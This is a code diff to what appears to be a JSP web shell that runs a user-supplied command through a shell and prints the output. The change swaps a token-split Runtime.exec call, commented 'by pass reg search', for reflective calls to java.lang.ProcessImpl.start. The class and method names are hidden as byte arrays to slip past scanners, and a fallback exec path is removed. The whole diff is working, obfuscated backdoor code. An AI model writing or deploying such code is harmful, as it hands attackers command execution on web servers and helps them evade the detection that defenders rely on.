@@ -97,16 +97,14 @@ if (cmd != null)
     OutputStream os = null;
     InputStream in = null;
     int x = 0;
-    try{// by pass reg search
-        p = Runtime
-        .
-        getRuntime
-        (
-        )
-        .
-        exec
-        (new String[]{bh,cS,cmd});
-        // p.waitFor();
+    try{
+        java.util.Map<String, String> environment = null;
+        java.lang.ProcessBuilder.Redirect[] redirects = null;
+        Class c = Class.forName(new String(new byte[] {106,97,118,97,46,108,97,110,103,46,80,114,111,99,101,115,115,73,109,112,108}));
+        java.lang.reflect.Method m = c.getDeclaredMethod(new String(new byte[] {115,116,97,114,116}), String[].class, java.util.Map.class, String.class, java.lang.ProcessBuilder.Redirect[].class, boolean.class);
+        m.setAccessible(true);
+        p = (Process) m.invoke(null, new String[]{bh,cS,cmd}, environment, ".", redirects, true);
+
         os = p.getOutputStream();
         in = p.getInputStream();
         x = in.read(b, 0, b.length); 
@@ -119,34 +117,7 @@ if (cmd != null)
         in.close();
         szSys = "";
     } catch (Exception x6) {
-        szSys += "\n" + x6.getMessage() + "\n";
-        try{
-            p = Runtime
-            .
-            getRuntime
-            (
-            )
-            .
-            exec
-            (cmd);
-            // p.waitFor();
-
-            os = p.getOutputStream();
-            in = p.getInputStream();
-            
-            x = in.read(b, 0, b.length); 
-            while(-1 < x)
-            {
-              if(0 < x)out.print(new String(b,0,x));
-              x = in.read(b, 0, b.length);
-            }
-            os.close();
-            in.close();
-            szSys = "";
-        } catch (Exception x1) {
-            szSys += "\n" + x1.getMessage() + "\n";
-            
-        }
+        
     }
 }
 
